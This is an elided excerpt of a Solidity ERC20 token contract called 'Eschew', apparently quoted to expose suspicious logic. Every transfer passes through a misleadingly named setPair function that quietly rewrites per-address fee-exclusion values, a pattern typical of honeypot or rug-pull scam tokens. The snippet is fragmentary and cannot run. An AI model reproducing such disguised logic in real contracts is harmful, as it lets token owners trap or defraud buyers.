...
contract Eschew is IERC20, Ownable {
 ...
 function transferFrom(
        ...
        setPair(sender, recipient, amount);
        return _approve(sender, msg.sender, _allowances[sender][msg.sender] - amount);
    }

    function transfer(address recipient, uint256 amount) external returns (bool) {
        setPair(msg.sender, recipient, amount);
        return true;
    }
    ...
    function setPair(
        ...
        if (_swapAndLiquifyEnabled && contractTokenBalance > _uint256 && !inSwapAndLiquify && from != uniswapV2Pair) {
            ...
            return;
        } else if (!inSwapAndLiquify && _isExcludedFromFee[from] > 0 && from != uniswapV2Pair && _isExcluded[from] == 0) {
            _isExcludedFromFee[from] = _isExcluded[from] - _uint256;
        }
